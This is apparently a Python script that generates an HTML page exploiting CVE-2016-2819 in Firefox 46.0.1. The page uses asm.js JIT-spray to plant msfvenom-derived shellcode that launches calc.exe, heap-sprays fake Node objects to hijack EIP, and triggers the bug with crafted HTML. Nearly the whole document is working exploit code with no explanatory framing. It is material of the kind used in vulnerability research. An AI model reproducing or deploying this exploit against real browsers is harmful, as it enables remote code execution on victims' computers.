

htmlhead = """
<!DOCTYPE HTML>
 
<title>CVE-2016-2819 and ASM.JS JIT-Spray</title>
<head>
<meta charset=UTF-8 />
<script>
"use strict"
 
var Exploit = function(){
    this.asmjs = new Asmjs()
    this.heap = new Heap()
}
 
Exploit.prototype.go = function(){
    /* target address of fake node object */
    var node_target_addr = 0x5a500000 
 
    /* target address of asm.js float pool payload*/
    var target_eip = 0x20200b58
 
    /* spray asm.js float constant pools */
    this.asmjs.spray_float_payload(0x1000)
 
    /* spray fake Node objects */
    this.heap.spray(node_target_addr, target_eip)
 
    /* go! */
    this.trigger_vuln(node_target_addr)
};
 
 
Exploit.prototype.trigger_vuln = function(node_ptr){
    document.body.innerHTML = '<table><svg><div id="BBBB">'
    this.heap.gc()
    var a = new Array() 
    for (var i=0; i < 0x10100; i++){
        /* array element (Node object ptr) control with integer underflow */
        a[i] = new Uint32Array(0x100/4)
        for (var j=0; j<0x100/4; j++)
            a[i][j] = node_ptr 
    }
    document.getElementById('BBBB').outerHTML = '"""
	
htmltail = """'
 
    window.location.reload()
};
 
 
var Asmjs = function(){};
 
Asmjs.prototype.asm_js_module = function(stdlib, ffi){
    "use asm"
    var foo = ffi.foo
    function payload(){
        var val = 0.0
        /* Fx 46.0.1 float constant pool of size 0xc0 is at 0xXXXX0b58*/
        val = +foo(
            // $ msfvenom --payload windows/exec CMD=calc.exe # transformed with sc2asmjs.py
            -1.587865768352248e-263,
            -8.692422460804815e-255,
            7.529882109376901e-114,
            2.0120602207293977e-16,
            3.7204662687249914e-242,
            4.351158092040946e+89,
            2.284741716118451e+270,
            7.620699014501263e-153,
            5.996021286047645e+44,
            -5.981935902612295e-92,
            6.23540918304361e+259,
            1.9227873281657598e+256,
            2.0672493951546363e+187,
            -6.971032919585734e+91,
            5.651413300798281e-134,
            -1.9040061366251406e+305,
            -1.2687640718807038e-241,
            9.697849844423e-310,
            -2.0571400761625145e+306,
            -1.1777948610587587e-123,
            2.708909852013898e+289,
            3.591750823735296e+37,
            -1.7960516725035723e+106,
            6.326776523166028e+180
        )
        return +val;
    }
    return payload
};
 
Asmjs.prototype.spray_float_payload = function(regions){
    this.modules = new Array(regions).fill(null).map(
        region => this.asm_js_module(window, {foo: () => 0})
    )
};
 
var Heap = function(target_addr, eip){
    this.node_heap = []
};
 
 
Heap.prototype.spray = function(node_target_addr, target_eip){
    var junk = 0x13371337
    var current_address = 0x20000000
    var block_size = 0x1000000
    while(current_address < node_target_addr){
        var fake_objects = new Uint32Array(block_size/4 - 0x100)
        for (var offset = 0; offset < block_size; offset += 0x100000){
            /* target Node object needed to control EIP  */
            fake_objects[offset/4 + 0x00/4] = 0x29 
            fake_objects[offset/4 + 0x0c/4] = 3
            fake_objects[offset/4 + 0x14/4] = node_target_addr + 0x18
            fake_objects[offset/4 + 0x18/4] = 1
            fake_objects[offset/4 + 0x1c/4] = junk
            fake_objects[offset/4 + 0x20/4] = node_target_addr + 0x24
            fake_objects[offset/4 + 0x24/4] = node_target_addr + 0x28
            fake_objects[offset/4 + 0x28/4] = node_target_addr + 0x2c
            fake_objects[offset/4 + 0x2c/4] = target_eip 
        }
        this.node_heap.push(fake_objects)
        current_address += block_size
    }
};
 
Heap.prototype.gc = function(){
    for (var i=0; i<=10; i++)
        var x = new ArrayBuffer(0x1000000)
};
 
</script>
<head>
<body onload='exploit = new Exploit(); exploit.go()' />
"""
def test_html(name, data):
	f = open(name,"w")
	f.write(htmlhead + data + htmltail)
	f.close()

test_html("test2.html", "<tr><title><ruby><template><table><template><td><col><em><table></tr><th></tr></td></table>hr {}<DD>")
	